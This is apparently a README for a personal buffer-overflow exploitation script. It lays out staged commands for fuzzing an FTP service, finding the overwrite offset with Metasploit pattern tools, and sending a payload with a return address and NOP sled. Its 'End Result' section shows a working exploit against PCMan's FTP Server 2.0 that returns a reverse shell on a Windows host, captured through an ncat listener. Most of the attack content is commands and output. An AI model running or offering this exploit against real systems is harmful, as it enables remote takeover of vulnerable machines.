# BufferOverflowToolkit
just some general purpose tools to help myself when detecting and performing buffer overflows

Ignore the code it's just PoC right now.

https://youtu.be/ljxVBLHIyWk

## Throw 200 bytes of data at the socket until it crashes, examine crash point -- stage 1
```
➜  ./bof.py --ip 192.168.1.236 --port 21 --bytes 200 --stage 1
```

## Use Metasploit-Framework's pattern_create tool automagically. -- stage 2
```
➜  ./bof.py --ip 192.168.1.236 --port 21 --bytes 2400 --stage 2
```

## Helper function to return the exact offset via pattern_offset from the instruction pointer -- stage 3
```
➜  ./bof.py --address 7043396F --stage 3
```

## Hunt your bad characters -- stage 4
TODO

## Blast your socket and get a connection back -- stage 5

```bash
➜  ./bof.py --ip 192.168.1.236 --port 21 --bytes 2008 --address 77F1E871 --nops 15 --stage 5
```

## End Result
```bash
[*] Connecting to 192.168.1.236...
[x] Connected to 220 PCMan's FTP Server 2.0 Ready.

[*] Sending payload...
[x] Payload delivered
[*] Waiting for target to connect
Ncat: Version 7.40 ( https://nmap.org/ncat )
Ncat: Listening on :::54321
Ncat: Listening on 0.0.0.0:54321
Ncat: Connection from 192.168.1.236.
Ncat: Connection from 192.168.1.236:50121.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\donthackmebro\Downloads>whoami
whoami
win-t72rd5qv7hv\donthackmebro
```
